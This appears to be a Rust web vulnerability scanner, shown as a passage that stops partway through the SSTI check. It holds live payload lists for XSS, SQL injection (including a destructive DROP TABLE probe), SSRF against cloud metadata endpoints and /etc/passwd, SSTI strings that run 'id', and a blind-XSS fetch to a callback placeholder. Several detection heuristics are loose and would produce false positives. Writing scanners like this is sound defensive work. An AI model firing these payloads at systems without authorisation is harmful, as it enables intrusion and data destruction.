//! HTTP-based vulnerability scanner with advanced vulnerability detection

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use regex::Regex;
use reqwest::header::HeaderMap;
use reqwest::Client;
use std::collections::HashMap;
use std::time::{Duration, Instant};

pub struct HttpScanner {
    client: Client,
    config: ScannerConfig,
}

impl HttpScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(30);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(5))
            .build()
            .expect("Failed to create HTTP client");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Security headers check (always performed)
        report.merge(self.check_security_headers(url).await?);

        // Clickjacking check (always performed)
        report.merge(self.check_clickjacking(url).await?);

        // CSRF token analysis (always performed)
        report.merge(self.check_csrf_protection(url).await?);

        // Session fixation check (always performed)
        report.merge(self.check_session_fixation(url).await?);

        // Aggressive mode: full vulnerability scan
        if self.config.aggressive {
            // XSS detection
            report.merge(self.check_xss_advanced(url).await?);

            // SQL Injection detection
            report.merge(self.check_sqli(url).await?);
            report.merge(self.check_sqli_time_based(url).await?);

            // NoSQL Injection detection
            report.merge(self.check_nosql_injection(url).await?);

            // SSRF detection
            report.merge(self.check_ssrf(url).await?);

            // SSTI detection
            report.merge(self.check_ssti(url).await?);

            // Command injection detection
            report.merge(self.check_command_injection(url).await?);

            // Rate limit detection
            report.merge(self.check_rate_limit(url).await?);

            // Open redirect detection
            report.merge(self.check_open_redirect(url).await?);

            // Authentication & Authorization checks
            report.merge(self.check_jwt_security(url).await?);
            report.merge(self.check_oauth_security(url).await?);
        }

        Ok(report)
    }

    /// Enhanced security headers check with detailed analysis
    async fn check_security_headers(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        match self.client.head(url).send().await {
            Ok(response) => {
                let headers = response.headers();

                // Check X-Frame-Options
                self.check_x_frame_options(headers, url, &mut report);

                // Check and analyze Content-Security-Policy
                self.check_csp(headers, url, &mut report);

                // Check HSTS configuration
                self.check_hsts(headers, url, &mut report);

                // Check X-Content-Type-Options
                if headers.get("X-Content-Type-Options").is_none() {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: "Missing X-Content-Type-Options header".to_string(),
                        description: "MIME-sniffing protection not enabled".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Add 'X-Content-Type-Options: nosniff' header".to_string()),
                        cwe: Some("CWE-1021".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }

                // Check Referrer-Policy
                if headers.get("Referrer-Policy").is_none() {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Low,
                        title: "Missing Referrer-Policy header".to_string(),
                        description: "Referrer information may leak to external sites".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Add 'Referrer-Policy: strict-origin-when-cross-origin' or 'no-referrer'".to_string()),
                        cwe: Some("CWE-359".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }

                // Check Permissions-Policy
                if headers.get("Permissions-Policy").is_none() {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Low,
                        title: "Missing Permissions-Policy header".to_string(),
                        description: "Browser features and APIs not restricted".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Add Permissions-Policy header to restrict access to browser APIs".to_string()),
                        cwe: Some("CWE-1021".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }

                // Check Cross-Origin-Opener-Policy
                if headers.get("Cross-Origin-Opener-Policy").is_none() {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Info,
                        title: "Missing Cross-Origin-Opener-Policy header".to_string(),
                        description: "Cross-origin window access not controlled".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Consider adding COOP header for better isolation".to_string()),
                        cwe: Some("CWE-1021".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }

                // Check Cross-Origin-Resource-Policy
                if headers.get("Cross-Origin-Resource-Policy").is_none() {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Info,
                        title: "Missing Cross-Origin-Resource-Policy header".to_string(),
                        description: "Cross-origin resource requests not controlled".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Consider adding CORP header: 'same-origin' or 'same-site'".to_string()),
                        cwe: Some("CWE-346".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }
            }
            Err(_) => {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Low,
                    title: "Failed to check security headers".to_string(),
                    description: "Could not connect to check security headers".to_string(),
                    location: Some(url.to_string()),
                    recommendation: None,
                    cwe: None,
                    owasp: None,
                });
            }
        }

        Ok(report)
    }

    fn check_x_frame_options(&self, headers: &HeaderMap, url: &str, report: &mut ScanReport) {
        if let Some(xfo) = headers.get("X-Frame-Options") {
            if let Ok(xfo_str) = xfo.to_str() {
                if xfo_str.contains("ALLOW-FROM") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Low,
                        title: "Deprecated X-Frame-Options directive".to_string(),
                        description: "ALLOW-FROM is deprecated and not supported in modern browsers".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Use Content-Security-Policy frame-ancestors directive instead".to_string()),
                        cwe: Some("CWE-1021".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }
            }
        } else {
            report.add_finding(Vuln {
                severity: VulnSeverity::Medium,
                title: "Missing X-Frame-Options header".to_string(),
                description: "Application may be vulnerable to clickjacking attacks".to_string(),
                location: Some(url.to_string()),
                recommendation: Some("Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header".to_string()),
                cwe: Some("CWE-1021".to_string()),
                owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
            });
        }
    }

    fn check_csp(&self, headers: &HeaderMap, url: &str, report: &mut ScanReport) {
        if let Some(csp) = headers.get("Content-Security-Policy") {
            if let Ok(csp_str) = csp.to_str() {
                // Analyze CSP for common weaknesses
                let csp_issues = self.analyze_csp(csp_str);

                for issue in csp_issues {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: issue.title,
                        description: issue.description,
                        location: Some(url.to_string()),
                        recommendation: Some(issue.recommendation),
                        cwe: Some("CWE-1021".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }

                // Check for unsafe-inline in script-src
                if csp_str.contains("'unsafe-inline'") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::High,
                        title: "CSP allows unsafe-inline".to_string(),
                        description: "The Content-Security-Policy permits 'unsafe-inline' which defeats XSS protection".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Remove 'unsafe-inline' and use nonces or hashes for inline scripts".to_string()),
                        cwe: Some("CWE-79".to_string()),
                        owasp: Some("A03:2021 - Injection".to_string()),
                    });
                }

                // Check for unsafe-eval
                if csp_str.contains("'unsafe-eval'") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: "CSP allows unsafe-eval".to_string(),
                        description: "The Content-Security-Policy permits 'unsafe-eval' which increases XSS risk".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Remove 'unsafe-eval' from the CSP".to_string()),
                        cwe: Some("CWE-79".to_string()),
                        owasp: Some("A03:2021 - Injection".to_string()),
                    });
                }
            }
        } else {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Missing Content-Security-Policy header".to_string(),
                description: "No Content-Security-Policy header found. This is a critical security header for XSS prevention".to_string(),
                location: Some(url.to_string()),
                recommendation: Some("Implement a strict Content-Security-Policy header".to_string()),
                cwe: Some("CWE-1021".to_string()),
                owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
            });
        }
    }

    fn analyze_csp(&self, csp: &str) -> Vec<CspIssue> {
        let mut issues = Vec::new();

        // Check for wildcards in source directives
        let dangerous_wildcards = vec![
            ("default-src", "default-src *"),
            ("script-src", "script-src *"),
            ("style-src", "style-src *"),
            ("img-src", "img-src *"),
            ("connect-src", "connect-src *"),
        ];

        for (directive, pattern) in dangerous_wildcards {
            if csp.contains(pattern) || csp.contains(&format!("{} *;", directive)) {
                issues.push(CspIssue {
                    title: format!("CSP {} directive allows wildcard sources", directive),
                    description: format!("The {} directive permits content from any origin", directive),
                    recommendation: format!("Replace wildcard with specific, trusted origins in {}", directive),
                });
            }
        }

        // Check for http: in HTTPS context
        if csp.contains("http:") {
            issues.push(CspIssue {
                title: "CSP allows insecure HTTP sources".to_string(),
                description: "The CSP includes http: which allows insecure content".to_string(),
                recommendation: "Remove http: sources and use HTTPS only".to_string(),
            });
        }

        issues
    }

    fn check_hsts(&self, headers: &HeaderMap, url: &str, report: &mut ScanReport) {
        if let Some(hsts) = headers.get("Strict-Transport-Security") {
            if let Ok(hsts_str) = hsts.to_str() {
                // Check max-age (should be at least 1 year = 31536000 seconds)
                if let Some(age_start) = hsts_str.find("max-age=") {
                    let age_part = &hsts_str[age_start + 8..];
                    let age_end = age_part.find(';').unwrap_or(age_part.len());
                    if let Ok(age) = age_part[..age_end].parse::<u64>() {
                        if age < 31536000 {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: "HSTS max-age too short".to_string(),
                                description: format!("HSTS max-age is {} seconds, recommended is at least 31536000 (1 year)", age),
                                location: Some(url.to_string()),
                                recommendation: Some("Increase max-age to at least 31536000 (1 year)".to_string()),
                                cwe: Some("CWE-523".to_string()),
                                owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                            });
                        }
                    }
                }

                // Check for includeSubDomains
                if !hsts_str.contains("includeSubDomains") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Low,
                        title: "HSTS missing includeSubDomains".to_string(),
                        description: "HSTS policy does not include subdomains".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Add 'includeSubDomains' to the HSTS header".to_string()),
                        cwe: Some("CWE-523".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }

                // Check for preload (if site should be in HSTS preload list)
                if !hsts_str.contains("preload") {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Info,
                        title: "HSTS not preloaded".to_string(),
                        description: "HSTS policy does not include preload directive".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Consider adding 'preload' and submitting to https://hstspreload.org/".to_string()),
                        cwe: Some("CWE-523".to_string()),
                        owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                    });
                }
            }
        } else if url.starts_with("https://") {
            report.add_finding(Vuln {
                severity: VulnSeverity::High,
                title: "Missing Strict-Transport-Security header".to_string(),
                description: "HTTPS site without HSTS is vulnerable to SSL stripping".to_string(),
                location: Some(url.to_string()),
                recommendation: Some("Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'".to_string()),
                cwe: Some("CWE-523".to_string()),
                owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
            });
        }
    }

    /// Advanced XSS detection with multiple contexts and payload types
    async fn check_xss_advanced(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Define XSS payloads for different contexts
        let payloads = self.get_xss_payloads();

        // Define injection points to test
        let injection_points = vec![
            ("query", "xss"),
            ("query", "search"),
            ("query", "q"),
            ("query", "input"),
            ("header", "X-Forwarded-For"),
            ("header", "User-Agent"),
            ("header", "Referer"),
            ("cookie", "session"),
        ];

        for (point_type, param_name) in injection_points {
            for payload in &payloads {
                let (test_url, test_headers) = self.prepare_xss_request(url, point_type, param_name, payload);

                let result = match point_type {
                    "query" => {
                        let mut req = self.client.get(&test_url);
                        for (k, v) in &test_headers {
                            req = req.header(k, v);
                        }
                        req.send().await
                    }
                    "header" | "cookie" => {
                        let mut req = self.client.get(url);
                        for (k, v) in &test_headers {
                            req = req.header(k, v);
                        }
                        req.send().await
                    }
                    _ => continue,
                };

                if let Ok(response) = result {
                    if let Ok(text) = response.text().await {
                        if self.check_xss_reflection(&text, payload, &payload.context) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("XSS vulnerability detected: {} injection", payload.context),
                                description: format!(
                                    "Reflected XSS in {} parameter '{}' via {} context",
                                    point_type, param_name, payload.context
                                ),
                                location: Some(test_url),
                                recommendation: Some("Implement proper input sanitization, output encoding, and use Content-Security-Policy".to_string()),
                                cwe: Some("CWE-79".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                            break; // Move to next injection point
                        }
                    }
                }
            }
        }

        // Blind XSS detection
        report.merge(self.check_blind_xss(url).await?);

        // DOM-based XSS detection
        report.merge(self.check_dom_xss(url).await?);

        Ok(report)
    }

    fn get_xss_payloads(&self) -> Vec<XssPayload> {
        vec![
            // HTML context payloads
            XssPayload {
                payload: "<script>alert(1)</script>",
                context: "HTML",
                signature: "alert(1)".to_string(),
            },
            XssPayload {
                payload: "<img src=x onerror=alert(1)>",
                context: "HTML",
                signature: "alert(1)".to_string(),
            },
            XssPayload {
                payload: "<svg onload=alert(1)>",
                context: "HTML",
                signature: "alert(1)".to_string(),
            },
            // JavaScript context payloads
            XssPayload {
                payload: "';alert(1);//",
                context: "JavaScript",
                signature: "';alert(1);//".to_string(),
            },
            XssPayload {
                payload: "\\';alert(1);//",
                context: "JavaScript",
                signature: "alert(1)".to_string(),
            },
            XssPayload {
                payload: "</script><script>alert(1)</script>",
                context: "JavaScript",
                signature: "alert(1)".to_string(),
            },
            // CSS context payloads
            XssPayload {
                payload: "</style><script>alert(1)</script>",
                context: "CSS",
                signature: "alert(1)".to_string(),
            },
            XssPayload {
                payload: "expression(alert(1))",
                context: "CSS",
                signature: "expression(alert(1))".to_string(),
            },
            // URL context payloads
            XssPayload {
                payload: "javascript:alert(1)",
                context: "URL",
                signature: "javascript:alert".to_string(),
            },
            XssPayload {
                payload: "data:text/html,<script>alert(1)</script>",
                context: "URL",
                signature: "data:text/html".to_string(),
            },
            // Attribute context payloads
            XssPayload {
                payload: "\"onfocus=alert(1) autofocus=\"",
                context: "Attribute",
                signature: "onfocus=alert".to_string(),
            },
            XssPayload {
                payload: "'onerror=alert(1)'",
                context: "Attribute",
                signature: "onerror=alert".to_string(),
            },
        ]
    }

    fn prepare_xss_request(&self, url: &str, point_type: &str, param_name: &str, payload: &XssPayload) -> (String, HashMap<String, String>) {
        let mut headers: HashMap<String, String> = HashMap::new();
        let encoded = urlencoding::encode(&payload.payload);

        let test_url = match point_type {
            "query" => {
                if url.contains('?') {
                    format!("{}&{}={}", url, param_name, encoded)
                } else {
                    format!("{}?{}={}", url, param_name, encoded)
                }
            }
            _ => url.to_string(),
        };

        match point_type {
            "header" => {
                headers.insert(param_name.to_string(), payload.payload.to_string());
            }
            "cookie" => {
                headers.insert("Cookie".to_string(), format!("{}={}", param_name, payload.payload));
            }
            _ => {}
        }

        (test_url, headers)
    }

    fn check_xss_reflection(&self, text: &str, payload: &XssPayload, context: &str) -> bool {
        // Check for various forms of reflection
        let text_lower = text.to_lowercase();

        // Direct reflection
        if text.contains(&payload.payload) || text.contains(&payload.signature) {
            return true;
        }

        // Context-specific checks
        match context {
            "HTML" => {
                // Check if script tags or event handlers are present
                text_lower.contains("<script")
                    || text_lower.contains("onerror=")
                    || text_lower.contains("onload=")
                    || text_lower.contains("onfocus=")
            }
            "JavaScript" => {
                // Check for script breakouts
                text_lower.contains("</script>")
                    || text_lower.contains("';alert(")
                    || text_lower.contains("\\';alert(")
            }
            "CSS" => {
                text_lower.contains("</style>")
                    || text_lower.contains("expression(")
                    || text_lower.contains("javascript:")
            }
            "URL" => {
                text_lower.contains("javascript:")
                    || text_lower.contains("data:text/html")
                    || text_lower.contains("vbscript:")
            }
            "Attribute" => {
                text_lower.contains("onerror=")
                    || text_lower.contains("onload=")
                    || text_lower.contains("onfocus=")
                    || text_lower.contains("onmouseover=")
            }
            _ => false,
        }
    }

    async fn check_blind_xss(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Generate a unique identifier using timestamp
        let unique_id = chrono::Utc::now().timestamp_millis();

        // Blind XSS payloads that might be reflected in logs, admin panels, etc.
        let blind_payloads = vec![
            // Unique identifier for blind XSS
            format!("<script>fetch('https://{{CALLBACK_URL}}?blindxss={}')</script>", unique_id),
            // Common storage locations
            format!("\";alert('BLIND_XSS_{}');//", unique_id),
            format!("'<script>alert('BLIND_XSS_{}')</script>'", unique_id),
        ];

        // Test common form submission points
        for payload in &blind_payloads {
            let test_url = if url.contains('?') {
                format!("{}&comment={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?comment={}", url, urlencoding::encode(payload))
            };

            if let Ok(response) = self.client.post(&test_url).form(&[("comment", payload)]).send().await {
                if response.status().is_success() {
                    // Blind XSS is hard to detect without a callback server
                    // Log potential injection point
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Info,
                        title: "Blind XSS injection point detected".to_string(),
                        description: "Input may be reflected in administrative interfaces or logs".to_string(),
                        location: Some(test_url),
                        recommendation: Some("Monitor administrative interfaces and logs for potential XSS reflections. Implement output encoding everywhere.".to_string()),
                        cwe: Some("CWE-79".to_string()),
                        owasp: Some("A03:2021 - Injection".to_string()),
                    });
                }
            }
        }

        Ok(report)
    }

    async fn check_dom_xss(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // DOM-based XSS payloads targeting common sinks
        let dom_payloads = vec![
            "#<img src=x onerror=alert(1)>",
            "#javascript:alert(1)",
            "?alert(1)",
            "<script>alert(1)</script>",
        ];

        for payload in &dom_payloads {
            let test_url = if url.ends_with('/') {
                format!("{}{}", url, payload)
            } else {
                format!("{}/{}", url, payload)
            };

            if let Ok(response) = self.client.get(&test_url).send().await {
                if let Ok(text) = response.text().await {
                    // Check for DOM XSS indicators in the response
                    let text_lower = text.to_lowercase();
                    if text_lower.contains("location.hash")
                        || text_lower.contains("location.search")
                        || text_lower.contains("document.write")
                        || text_lower.contains("innerhtml")
                        || text_lower.contains("outerhtml")
                    {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: "Potential DOM-based XSS vulnerability".to_string(),
                            description: "Application may use user input in DOM sinks without proper sanitization".to_string(),
                            location: Some(test_url),
                            recommendation: Some("Use safe DOM APIs (textContent, setAttribute), avoid dangerous sinks (innerHTML, location.*), and sanitize input".to_string()),
                            cwe: Some("CWE-79".to_string()),
                            owasp: Some("A03:2021 - Injection".to_string()),
                        });
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// SQL Injection detection with multiple techniques
    async fn check_sqli(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // SQLi payloads for different techniques
        let sqli_tests = vec![
            // Error-based SQLi
            SqliPayload {
                payload: "'",
                technique: "Error-based",
                pattern: "SQL syntax|mysql_fetch|ORA-|PostgreSQL|Warning: pg_|Microsoft SQL|SQLite3::",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "' OR '1'='1",
                technique: "Error-based",
                pattern: "SQL syntax|mysql_fetch|ORA-|PostgreSQL|Warning: pg_|Microsoft SQL|SQLite3::",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "1' ORDER BY 1--",
                technique: "Error-based",
                pattern: "SQL syntax|mysql_fetch|ORA-|PostgreSQL|Warning: pg_|Microsoft SQL|SQLite3::",
                severity: VulnSeverity::High,
            },
            // Boolean-based SQLi
            SqliPayload {
                payload: "' AND 1=1--",
                technique: "Boolean-based",
                pattern: "",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "' AND 1=2--",
                technique: "Boolean-based",
                pattern: "",
                severity: VulnSeverity::High,
            },
            // Time-based SQLi
            SqliPayload {
                payload: "' AND SLEEP(5)--",
                technique: "Time-based",
                pattern: "",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "'; WAITFOR DELAY '00:00:05'--",
                technique: "Time-based (MSSQL)",
                pattern: "",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "1'; SELECT pg_sleep(5)--",
                technique: "Time-based (PostgreSQL)",
                pattern: "",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "1' AND dbms_pipe.receive_message(('a'),5)--",
                technique: "Time-based (Oracle)",
                pattern: "",
                severity: VulnSeverity::High,
            },
            // UNION-based SQLi
            SqliPayload {
                payload: "' UNION SELECT NULL--",
                technique: "UNION-based",
                pattern: "SQL syntax|mysql_fetch|ORA-|PostgreSQL|Warning: pg_|Microsoft SQL|SQLite3::",
                severity: VulnSeverity::High,
            },
            SqliPayload {
                payload: "' UNION SELECT 1,2,3--",
                technique: "UNION-based",
                pattern: "SQL syntax|mysql_fetch|ORA-|PostgreSQL|Warning: pg_|Microsoft SQL|SQLite3::",
                severity: VulnSeverity::High,
            },
            // Stacked queries
            SqliPayload {
                payload: "'; DROP TABLE test--",
                technique: "Stacked queries",
                pattern: "SQL syntax|mysql_fetch|ORA-|PostgreSQL|Warning: pg_|Microsoft SQL|SQLite3::",
                severity: VulnSeverity::Critical,
            },
        ];

        // Test common injection points
        let test_params = vec!["id", "user", "search", "cat", "product", "page"];

        for param in &test_params {
            for sqli_test in &sqli_tests {
                let encoded = urlencoding::encode(&sqli_test.payload);
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, encoded)
                } else {
                    format!("{}?{}={}", url, param, encoded)
                };

                match sqli_test.technique {
                    "Error-based" | "UNION-based" | "Stacked queries" => {
                        if let Ok(response) = self.client.get(&test_url).send().await {
                            if let Ok(text) = response.text().await {
                                if self.check_sqli_error(&text, sqli_test) {
                                    report.add_finding(Vuln {
                                        severity: sqli_test.severity,
                                        title: format!("SQL Injection detected: {}", sqli_test.technique),
                                        description: format!(
                                            "{} SQL injection in parameter '{}'. Database error detected in response.",
                                            sqli_test.technique, param
                                        ),
                                        location: Some(test_url),
                                        recommendation: Some("Use parameterized queries, prepared statements, or ORM. Validate and sanitize all user input.".to_string()),
                                        cwe: Some("CWE-89".to_string()),
                                        owasp: Some("A03:2021 - Injection".to_string()),
                                    });
                                }
                            }
                        }
                    }
                    "Time-based" => {
                        let start = Instant::now();
                        if let Ok(_) = self.client.get(&test_url).send().await {
                            let duration = start.elapsed();
                            // If response took significantly longer (4+ seconds), it's likely vulnerable
                            if duration.as_secs() >= 4 {
                                report.add_finding(Vuln {
                                    severity: sqli_test.severity,
                                    title: format!("SQL Injection detected: {}", sqli_test.technique),
                                    description: format!(
                                        "{} SQL injection in parameter '{}'. Response delay indicates vulnerability.",
                                        sqli_test.technique, param
                                    ),
                                    location: Some(test_url),
                                    recommendation: Some("Use parameterized queries, prepared statements, or ORM.".to_string()),
                                    cwe: Some("CWE-89".to_string()),
                                    owasp: Some("A03:2021 - Injection".to_string()),
                                });
                            }
                        }
                    }
                    "Boolean-based" => {
                        // Send two requests with different boolean conditions
                        let true_payload = urlencoding::encode("' AND 1=1--");
                        let false_payload = urlencoding::encode("' AND 1=2--");

                        let true_url = format!("{}?{}=1{}", url, param, true_payload);
                        let false_url = format!("{}?{}=1{}", url, param, false_payload);

                        let true_response = self.client.get(&true_url).send().await;
                        let false_response = self.client.get(&false_url).send().await;

                        if let (Ok(tr), Ok(fr)) = (true_response, false_response) {
                            let true_status = tr.status();
                            let false_status = fr.status();

                            // Different responses might indicate SQLi
                            if true_status != false_status
                                || true_status.is_success() != false_status.is_success()
                            {
                                report.add_finding(Vuln {
                                    severity: sqli_test.severity,
                                    title: format!("SQL Injection detected: {}", sqli_test.technique),
                                    description: format!(
                                        "{} SQL injection in parameter '{}'. Different responses for boolean conditions.",
                                        sqli_test.technique, param
                                    ),
                                    location: Some(format!("{} (boolean comparison)", test_url)),
                                    recommendation: Some("Use parameterized queries or prepared statements.".to_string()),
                                    cwe: Some("CWE-89".to_string()),
                                    owasp: Some("A03:2021 - Injection".to_string()),
                                });
                            }
                        }
                    }
                    _ => {}
                }
            }
        }

        Ok(report)
    }

    fn check_sqli_error(&self, text: &str, payload: &SqliPayload) -> bool {
        if payload.pattern.is_empty() {
            return false;
        }

        if let Ok(re) = Regex::new(&payload.pattern) {
            re.is_match(text)
        } else {
            // Fallback to string matching
            let patterns = vec![
                "SQL syntax",
                "mysql_fetch",
                "ORA-",
                "PostgreSQL",
                "Warning: pg_",
                "Microsoft SQL",
                "SQLite3::",
                "ODBC",
                "JET Database",
                "Unclosed quotation mark",
            ];

            for pattern in &patterns {
                if text.contains(pattern) {
                    return true;
                }
            }
            false
        }
    }

    /// SSRF (Server-Side Request Forgery) detection
    async fn check_ssrf(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // SSRF payloads targeting internal infrastructure
        let ssrf_payloads = vec![
            // Localhost
            ("http://127.0.0.1", "Localhost access"),
            ("http://localhost", "Localhost access"),
            ("http://127.1", "Localhost access (alternative)"),
            ("http://2130706433", "Localhost (decimal IP)"),
            ("http://0177.0.0.1", "Localhost (octal IP)"),
            // Internal network ranges
            ("http://192.168.1.1", "Internal network (192.168.x.x)"),
            ("http://10.0.0.1", "Internal network (10.x.x.x)"),
            ("http://172.16.0.1", "Internal network (172.16.x.x)"),
            // Cloud metadata services (AWS, GCP, Azure)
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata service"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata service"),
            ("http://169.254.169.254/metadata/instance", "Azure metadata service"),
            // File protocol
            ("file:///etc/passwd", "File protocol access"),
            // DNS rebinding
            ("http:// BurpCollaborator", "DNS rebinding"),
        ];

        let test_params = vec!["url", "dest", "redirect", "feed", "fetch", "link"];

        for param in &test_params {
            for (payload, desc) in &ssrf_payloads {
                let encoded = urlencoding::encode(payload);
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, encoded)
                } else {
                    format!("{}?{}={}", url, param, encoded)
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    let status = response.status();

                    // SSRF indicators
                    if status.is_success()
                        || status.as_u16() == 200
                        || status.as_u16() == 301
                        || status.as_u16() == 302
                    {
                        if let Ok(text) = response.text().await {
                            // Check for metadata service responses
                            if text.contains("ami-id")
                                || text.contains("instance-id")
                                || text.contains("computeMetadata")
                                || text.contains("root:")
                            {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::Critical,
                                    title: format!("SSRF vulnerability detected: {}", desc),
                                    description: format!("Server is making requests to internal resources. Payload: {}", payload),
                                    location: Some(test_url.clone()),
                                    recommendation: Some("Implement URL validation using an allowlist, disable external URL fetching, and use network segmentation.".to_string()),
                                    cwe: Some("CWE-918".to_string()),
                                    owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                                });
                            }
                        }

                        // Different status code might indicate SSRF attempt succeeded
                        if status.as_u16() != 404 && status.as_u16() != 400 {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("Potential SSRF: {}", desc),
                                description: format!("Application may be vulnerable to SSRF. Internal resource access test returned status {}", status.as_u16()),
                                location: Some(test_url),
                                recommendation: Some("Validate and sanitize all URLs, implement allowlist-based filtering, and use network egress filtering.".to_string()),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some("A10:2021 - Server-Side Request Forgery".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// SSTI (Server-Side Template Injection) detection
    async fn check_ssti(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Template injection payloads for various engines
        let ssti_payloads = vec![
            // Jinja2/Python
            SstiPayload {
                payload: "{{7*7}}",
                engine: "Jinja2",
                signature: "49",
            },
            SstiPayload {
                payload: "{{config}}",
                engine: "Jinja2",
                signature: "<Config",
            },
            SstiPayload {
                payload: "{% for x in (1,2,3) %}{{x}}{% endfor %}",
                engine: "Jinja2",
                signature: "123",
            },
            // Twig/PHP
            SstiPayload {
                payload: "{{_self.env.display(\"id\")}}",
                engine: "Twig",
                signature: "uid=",
            },
            SstiPayload {
                payload: "{{7*'7'}}",
                engine: "Twig",
                signature: "7777777",
            },
            // Freemarker/Java
            SstiPayload {
                payload: "${7*7}",
                engine: "Freemarker",
                signature: "49",
            },
            SstiPayload {
                payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                engine: "Freemarker",
                signature: "uid=",
            },
            // Velocity/Java
            SstiPayload {
                payload: "#set($x=7*7)$x",
                engine: "Velocity",
                signature: "49",
            },
            // Smarty/PHP
            SstiPayload {
                payload: "{$7*7}",
                engine: "Smarty",
                signature: "49",
            },
            SstiPayload {
                payload: "{php}system('id');{/php}",
                engine: "Smarty",
                signature: "uid=",
            },
            // Mako/Python
            SstiPayload {
                payload: "<% 7*7 %>",
                engine: "Mako",
                signature: "49",
            },
            // ERB/Ruby
            SstiPayload {
                payload: "<%= 7*7 %>",
                engine: "ERB",
                signature: "49",
            },
            // PEBL/Python
            SstiPayload {
                payload: "{7*7}",
                engine: "PEBL",
                signature: "49",
            },
            // Handlebars
            SstiPayload {
                payload: "{{#with \"s\" as |string|}}{{#with \"s\"}}{{#with \"s\"}}{{#with \"s\"}}{{#with \"s\"}}{{test}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}",
                engine: "Handlebars",
                signature: "",
            },
        ];

        let test_params = vec!["name", "user", "search", "input", "template", "view"];

        for param in &test_params {
            for payload in &ssti_payloads {
                let encoded = urlencoding::encode(&payload.payload);
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, encoded)
                } else {
                    format!("{}?{}={}", url, param, encoded)
                };

